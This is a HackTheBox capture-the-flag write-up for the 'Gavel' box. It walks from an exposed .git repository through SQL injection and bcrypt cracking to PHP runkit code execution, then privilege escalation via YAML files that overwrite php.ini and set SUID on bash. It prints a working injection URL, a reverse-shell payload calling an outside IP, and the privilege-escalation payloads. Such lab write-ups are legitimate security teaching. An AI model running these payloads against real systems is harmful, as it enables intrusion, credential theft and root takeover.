---
title: "Gavel - HackTheBox Writeup"
date: "2025-11-29"
platform: "HackTheBox"
category: "Linux Web / Deserialization"
difficulty: "Medium"
tags: [
  "Web Application",
  "SQL Injection",
  "Git Exposure",
  "Source Code Review",
  "bcrypt Cracking",
  "PHP Runkit Execution",
  "Arbitrary Code Execution",
  "Reverse Shell",
  "YAML Deserialization",
  "Privilege Escalation",
  "php.ini Overwrite",
  "SUID Abuse",
  "Linux Privilege Escalation",
  "Worker Process Exploitation"
]
excerpt: "A full exploitation chain beginning with exposed Git repo leakage, leading to SQL injection for credential extraction, PHP code execution via runkit, and a creative YAML deserialization attack to overwrite php.ini and escalate to root through SUID manipulation."
readingTime: 20
featured: true
---

## TL;DR

Gavel is a medium-difficulty Linux box featuring a bidding system vulnerable to SQL injection through Git exposure, PHP code execution via bid rules, and privilege escalation through YAML deserialization to overwrite PHP configuration files. The exploitation chain involves cracking hashed credentials, exploiting `runkit` functions, and manipulating a root-owned worker process.

---

## Reconnaissance

Let's start with the classic nmap scan to see what we're dealing with:

```bash
nmap -sV -sC 10.10.11.97 -p- -T4 -o gavel_nmap.txt
```

After what felt like an eternity (838 seconds to be exact), we got our results:

```
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp    open     http     Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
```

Interesting! The web server redirects to `gavel.htb`, so let's add that to our `/etc/hosts`:

```bash
echo "10.10.11.97 gavel.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration - The Auction House

Navigating to `http://gavel.htb`, we're greeted with a bidding system:

![1](1.png)

Time to create an account and see what's behind the curtain. After registering and logging in, we discover a full-fledged auction platform where users can bid on items. Pretty neat!

### Directory Busting & The Golden Find

Running directory brute-forcing didn't reveal much at first... until we stumbled upon something juicy: **a `.git` directory!** 🎉

This is a classic developer mistake - leaving the Git repository exposed on the production server. Time to extract it!

### Git Dumping

Using [git-dumper](https://github.com/arthaud/git-dumper), we can reconstruct the entire repository:

```bash
git-dumper http://gavel.htb/.git/ ./gavel-repo
```

Boom! We now have the full source code of the application. Let's dig into it.

---

## Source Code Analysis - Finding the SQL Injection

Reviewing the code, we spot something interesting in the inventory handling:

![2](2.png)

The `user_id` and `sort` parameters are vulnerable to SQL injection! The query construction doesn't properly sanitize these inputs before passing them to the database.

### Crafting the SQL Injection Payload

After some testing, we craft a beautiful SQL injection payload to extract user credentials:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

This query:
1. Uses backtick injection to escape the original query context
2. Creates a derived table that concatenates usernames and passwords
3. Extracts data from the `users` table

And we get a hit! 🎯

```
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

---

## Password Cracking

The hash format `$2y$10$...` indicates bcrypt. Time to fire up hashcat:

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![3](3.png)

Success! The password is cracked:

```
auctioneer:midnight1
```

---

## Admin Access - The Auctioneer's Dashboard

Logging in as `auctioneer:midnight1`, we gain access to the admin panel:

![4](4.png)

This is where things get really interesting. As an admin, we can edit auction rules. But what ARE these rules?

### Understanding the Vulnerability

Diving back into the source code, we find the critical vulnerability in `bid_handler.php`:

```php
// admin.php - allows arbitrary rule input
<input type="text" class="form-control form-control-user" name="rule" placeholder="Edit rule">

// bid_handler.php - executes the rule as PHP code
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

**Holy PHP Batman!** The application is using `runkit_function_add()` to dynamically create a function from user-supplied input, then **executing it**. This is basically asking for arbitrary code execution.

---

## Getting a Shell - The Trojan Horse Bid

We can inject PHP code that will execute when anyone places a bid. Let's create our reverse shell payload:

**Payload for all three auction rules:**
```php
return system('bash -c "sh -i >& /dev/tcp/10.10.14.145/4445 0>&1"');
```

1. Edit the rules for all active auctions
2. Set up our netcat listener: `nc -lvnp 4445`
3. Place a bid of 99999 (our "trojan horse" bid 😈)
4. Wait for the callback...

![5](5.png)

**Shell acquired!** We now have a foothold on the box as the web user.

---

## Privilege Escalation - Breaking Out of PHP Jail

Now comes the tricky part. Examining the PHP configuration reveals we're in a heavily restricted environment:

```
disable_functions = system,passthru,exec,popen...
open_basedir = /opt/gavel/...
```

Most dangerous functions are disabled, and we're restricted to the `/opt/gavel/` directory. But there's a way out...

### The YAML Worker Exploitation

The system has a backend worker process running as **root** that processes YAML files. If we can overwrite the PHP configuration file, we can remove these restrictions!

#### Step 1: Overwrite php.ini

Create a malicious YAML file that writes a new, unrestricted `php.ini`:

```bash
cat > ini_overwrite.yaml << 'EOF'
name: IniOverwrite
description: Remove restrictions
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Config Update"
rule: |
  file_put_contents('/opt/gavel/.config/php/php.ini',
    "engine=On\n
     display_errors=On\n
     open_basedir=/\n
     disable_functions=\n"
  );
  return false;
EOF
```

![6](6.png)

This YAML file will be processed by the root worker, which will execute our `file_put_contents()` call, overwriting the PHP configuration to remove all restrictions!

#### Step 2: Make /bin/bash SUID

Now that we can execute system commands freely, let's create another YAML payload to make `/bin/bash` SUID:

```bash
cat > root_suid.yaml << 'EOF'
name: RootSuid
description: Get root
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Root Shell"
rule: |
  system("chmod u+s /bin/bash");
  return false;
EOF
```

![7](7.png)

The root worker processes this YAML, executing `chmod u+s /bin/bash` as root, giving bash the SUID bit!

#### Step 3: Profit!

Simply run:

```bash
/bin/bash -p
```

The `-p` flag preserves the SUID privileges, giving us a root shell!

**Root flag acquired:**
```
67ad570b6441c011d6cdf9595e24e7b9
```

---

## Key Takeaways

1. **Never expose .git directories** - This gave us the entire source code and made finding vulnerabilities trivial
2. **Input sanitization is critical** - The SQL injection could have been prevented with prepared statements
3. **Dynamic code execution is dangerous** - Using `runkit_function_add()` with user input is a recipe for disaster
4. **Principle of least privilege** - The root worker shouldn't be processing user-controlled YAML files
5. **PHP restrictions can be bypassed** - `disable_functions` and `open_basedir` are not foolproof security measures

---

## Conclusion

Gavel was a fantastic box that demonstrated a complete exploitation chain: information disclosure → SQL injection → authentication bypass → code execution → privilege escalation. The creative use of YAML deserialization to manipulate PHP configuration files was particularly clever.

Remember: **The gavel has spoken, and it says: secure your code!** 🔨

---

